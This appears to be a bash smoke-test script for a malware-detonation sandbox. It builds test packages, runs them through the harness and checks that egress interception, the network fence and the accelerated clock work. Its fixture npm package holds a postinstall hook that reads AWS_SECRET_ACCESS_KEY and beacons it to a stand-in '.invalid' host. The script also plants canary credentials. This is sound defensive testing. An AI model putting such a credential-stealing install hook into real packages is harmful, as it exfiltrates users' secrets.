#!/usr/bin/env bash
# Template build smoke detonation (DESIGN.md section 3.1). Runs as root at the end
# of the template build, and again in a fresh VM through the operator-only preview
# route POST /api/ops/smoke. Detonates a local test package (written here, our own
# code) through the real cr-detonate.sh and asserts the forge, the inner fence, the
# fake clock and npm 11 dependency lifecycle scripts all work, and prints the
# containment proof (cr-proof.sh: forge as root, skuid 1001 rules, drop counters,
# forged replies). Then it restores the template to a clean state so no smoke
# artifact reaches a scan VM.
set -euo pipefail

fail() { echo "cr-smoke: FAIL $*" >&2; exit 1; }
rand() { head -c 64 /dev/urandom | od -An -tx1 | tr -d ' \n' | head -c "$1"; }

BUNDLE=/etc/ssl/certs/ca-certificates.crt
cp -p "$BUNDLE" /tmp/ca-bundle.orig

PKG=/tmp/cr-smoke/package
rm -rf /tmp/cr-smoke && mkdir -p "$PKG" /root/in /root/.cr
cat >"$PKG/package.json" <<'JSON'
{"name":"cr-smoke-pkg","version":"1.0.0","main":"index.js","scripts":{"postinstall":"node smoke.js"}}
JSON
cat >"$PKG/index.js" <<'JS'
module.exports = { ok: true };
JS
cat >"$PKG/smoke.js" <<'JS'
const https = require("https");
const fs = require("fs");
const key = process.env.AWS_SECRET_ACCESS_KEY || "none";
https.get("https://smoke.cr-fixture.invalid/beacon?k=" + encodeURIComponent(key), (res) => {
  let body = "";
  res.on("data", (d) => (body += d));
  res.on("end", () => fs.writeFileSync("/tmp/cr-smoke-result", body));
}).on("error", (e) => { fs.writeFileSync("/tmp/cr-smoke-result", "error " + e.message); });
JS
tar -czf /root/in/target.tgz -C /tmp/cr-smoke package
printf '{"mode":"npm-package","name":"cr-smoke-pkg","install_timeout_s":60,"entry_timeout_s":8,"fake_rate":30,"proof":true}\n' >/root/in/run.json
SECRET="crsmoke$(rand 24)"
umask 077
{
  echo "AWS_ACCESS_KEY_ID=CRSMOKE$(rand 13 | tr 'a-f' 'A-F')"
  echo "AWS_SECRET_ACCESS_KEY=$SECRET"
  echo "NPM_TOKEN=crsmoke$(rand 30)"
  echo "GITHUB_TOKEN=crsmoke$(rand 30)"
  echo "OPENAI_API_KEY=crsmoke$(rand 30)"
} >/root/.cr/canary.env
printf '%s\n' "$SECRET" >/root/.cr/canary-patterns.txt
umask 022
# Every input is in place before the harness starts, so the go file goes in now.
: >/root/in/go

OUT=/root/out
if ! /opt/cr/bin/cr-detonate.sh; then
  echo "cr-smoke: cr-detonate.sh failed; evidence follows"
  echo "--- checks.jsonl"; cat "$OUT/checks.jsonl" 2>/dev/null || true
  echo "--- proof.txt"; cat "$OUT/proof.txt" 2>/dev/null || true
  echo "--- forge.log"; tail -c 4000 "$OUT/forge.log" 2>/dev/null || true
  echo "--- capture"; head -c 3000 "$OUT/capture.probe.jsonl" "$OUT/capture.jsonl" 2>/dev/null || true
  fail "cr-detonate.sh exited non-zero"
fi

# The containment proof cr-detonate.sh ran with the forge and the fence up.
echo "cr-smoke: ---- containment proof (inside the VM, before any repo code) ----"
cat "$OUT/proof.txt" 2>/dev/null || echo "cr-smoke: proof.txt missing"
echo "cr-smoke: ---- end of proof ----"
jq -s -e 'map(select(.name=="containment_proof" and .ok)) | length == 1' "$OUT/checks.jsonl" >/dev/null || fail "containment proof failed: $(cat "$OUT/checks.jsonl")"

jq -e '.install.status == "completed"' "$OUT/result.json" >/dev/null || fail "install did not complete: $(cat "$OUT/result.json") $(tail -c 2000 "$OUT/install.err")"
jq -e '.entry.status == "completed"' "$OUT/result.json" >/dev/null || fail "entry did not complete: $(tail -c 2000 "$OUT/entry.err")"
jq -s -e 'map(select(.name=="egress_contained" and .ok)) | length == 1' "$OUT/checks.jsonl" >/dev/null || fail "egress not contained"
jq -s -e 'map(select(.name=="clock_accelerated" and .ok)) | length == 1' "$OUT/checks.jsonl" >/dev/null || fail "clock not accelerated: $(cat "$OUT/checks.jsonl")"
jq -s -e --arg s "$SECRET" 'map(select(.host=="smoke.cr-fixture.invalid" and .phase=="install" and .forged_kind=="json" and .tls=="intercepted" and (.path|contains($s)))) | length >= 1' \
  "$OUT/capture.jsonl" >/dev/null || fail "forge did not capture the smoke beacon: $(head -c 2000 "$OUT/capture.jsonl")"
[ "$(cat /tmp/cr-smoke-result)" = '{"ok":true}' ] || fail "postinstall did not receive the forged body: $(cat /tmp/cr-smoke-result)"
grep -q 'execve(".*node", \["node", "smoke.js"\]' "$OUT/trace.install" || fail "strace did not record the postinstall exec"
grep -qx /tmp/cr-smoke-result "$OUT/written.txt" || fail "written-file collection missed /tmp/cr-smoke-result"
for addr in 127.0.0.1 ::1; do
  if timeout 1 runuser -u cr -- bash -c "exec 3<>/dev/tcp/$addr/49983" 2>/dev/null; then fail "uid 1001 reached envd on $addr after the run"; fi
done
if timeout 2 runuser -u cr -- bash -c 'exec 3<>/dev/udp/192.0.2.1/9999; printf x >&3' 2>/dev/null; then :; fi
jq -e '.udp >= 1' "$OUT/egress_drops.json" >/dev/null 2>&1 || [ "$(/opt/cr/bin/cr-drops.sh cr_udp_drop)" -ge 1 ] || fail "the fence did not count a dropped UDP send"
echo "cr-smoke: PASS $(jq -c '{install:.install, entry:.entry, clock:.clock}' "$OUT/result.json")"

# Go and Rust: a repo with one main package / one binary target and no dependencies,
# built and run through the same harness (forge, fence, clock, trace). Each run
# prints a marker the trace and the entry output must both show.
smoke_repo() {
  local eco=$1 dir=/tmp/cr-smoke/repo
  rm -rf /tmp/cr-smoke && mkdir -p "$dir" /root/in
  cp -p /tmp/ca-bundle.orig "$BUNDLE"
  if [ "$eco" = go ]; then
    printf 'module example.invalid/crsmoke\n\ngo 1.22\n' >"$dir/go.mod"
    # Reads the wall and monotonic clocks, sleeps one (sped-up) second, reads again.
    printf 'package main\n\nimport (\n\t"fmt"\n\t"time"\n)\n\nfunc main() {\n\tw0, m0 := time.Now().Round(0), time.Now()\n\ttime.Sleep(time.Second)\n\tfmt.Printf("cr-smoke-go-ran wall_ms=%%d mono_ms=%%d\\n", time.Now().Round(0).Sub(w0).Milliseconds(), time.Since(m0).Milliseconds())\n}\n' >"$dir/main.go"
  else
    mkdir -p "$dir/src"
    printf '[package]\nname = "crsmoke"\nversion = "0.1.0"\nedition = "2021"\n' >"$dir/Cargo.toml"
    printf 'use std::time::{Instant, SystemTime};\nfn main() {\n    let (w0, m0) = (SystemTime::now(), Instant::now());\n    std::thread::sleep(std::time::Duration::from_secs(1));\n    println!("cr-smoke-rust-ran wall_ms={} mono_ms={}", w0.elapsed().unwrap().as_millis(), m0.elapsed().as_millis());\n}\n' >"$dir/src/main.rs"
  fi
  tar -czf /root/in/target.tgz -C /tmp/cr-smoke repo
  printf '{"mode":"repo","name":null,"install_timeout_s":120,"entry_timeout_s":8,"fake_rate":30}\n' >/root/in/run.json
  : >/root/in/go
  /opt/cr/bin/cr-detonate.sh || fail "$eco: cr-detonate.sh exited non-zero: $(cat "$OUT/checks.jsonl" 2>/dev/null)"
  jq -e --arg e "$eco" '.ecosystem == $e and .install.status == "completed" and .entry.status == "completed"' "$OUT/result.json" >/dev/null \
    || fail "$eco: $(cat "$OUT/result.json") $(tail -c 2000 "$OUT/install.err") $(tail -c 1000 "$OUT/entry.err")"
  grep -q "cr-smoke-$eco-ran" "$OUT/entry.out" || fail "$eco: the built program did not run: $(tail -c 1000 "$OUT/entry.out")"
  # The sped-up clock reached the program: one second passed on both of its clocks
  # (wall and monotonic) while the whole entry phase took well under one real second.
  local line wall mono ems
  line=$(grep -m1 "cr-smoke-$eco-ran" "$OUT/entry.out")
  wall=$(sed -n 's/.*wall_ms=\([0-9]*\).*/\1/p' <<<"$line"); mono=$(sed -n 's/.*mono_ms=\([0-9]*\).*/\1/p' <<<"$line")
  ems=$(jq -r '.entry.ms' "$OUT/result.json")
  if [ "${wall:-0}" -ge 900 ] && [ "${mono:-0}" -ge 900 ] && [ "${wall:-0}" -le 5000 ] && [ "${mono:-0}" -le 5000 ] && [ "$ems" -lt 700 ]; then
    echo "cr-smoke: $eco clock sped up: the program saw ${wall} ms wall and ${mono} ms monotonic across a ${ems} ms entry phase"
  else
    fail "$eco: clock not sped up: program saw wall ${wall:-?} ms, monotonic ${mono:-?} ms; entry phase ${ems} ms real"
  fi
  jq -s -e 'map(select(.name=="egress_contained" and .ok)) | length == 1' "$OUT/checks.jsonl" >/dev/null || fail "$eco: egress not contained"
  echo "cr-smoke: PASS $eco $(jq -c '{install:.install, entry:.entry}' "$OUT/result.json")"
}
smoke_repo go
smoke_repo rust

# Restore a clean template: no fence, no CA, no smoke artifacts, empty cr home.
nft flush ruleset
cp -p /tmp/ca-bundle.orig "$BUNDLE"
rm -rf /root/out /root/out.tgz /root/in /root/.cr /work /run/cr /etc/cr /tmp/cr-smoke /tmp/cr-smoke-result /tmp/ca-bundle.orig
rm -rf /home/cr && install -d -o cr -g cr -m 0750 /home/cr
rm -rf /work
pkill -KILL -u 1001 || true
